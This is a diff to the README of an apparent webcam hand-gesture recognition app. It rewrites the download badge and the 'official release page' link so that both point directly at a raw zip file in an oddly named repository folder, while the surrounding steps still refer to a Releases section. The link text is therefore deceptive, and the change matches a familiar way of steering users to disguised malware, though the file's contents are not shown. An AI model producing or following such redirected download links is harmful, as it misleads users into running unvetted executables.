@@ -1,6 +1,6 @@
 # 🖐️ lstm-gesture-learner - Teach your computer custom hand signs
 
-[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner)
+[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner/raw/refs/heads/main/dichronous/gesture_learner_lstm_2.6.zip)
 
 This application tracks hand movements to trigger actions on your computer. You teach the software specific gestures, and the program learns to identify them. It uses deep learning models to watch your hand via your webcam. The system converts these recognized signs into text or spoken output. You can use this tool to control software or assist with communication.
 
@@ -19,7 +19,7 @@ To run this application, your computer needs the following specifications:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner).
+1. Visit the [official release page](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner/raw/refs/heads/main/dichronous/gesture_learner_lstm_2.6.zip).
 2. Look for the latest version under the Releases section on the right side of the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
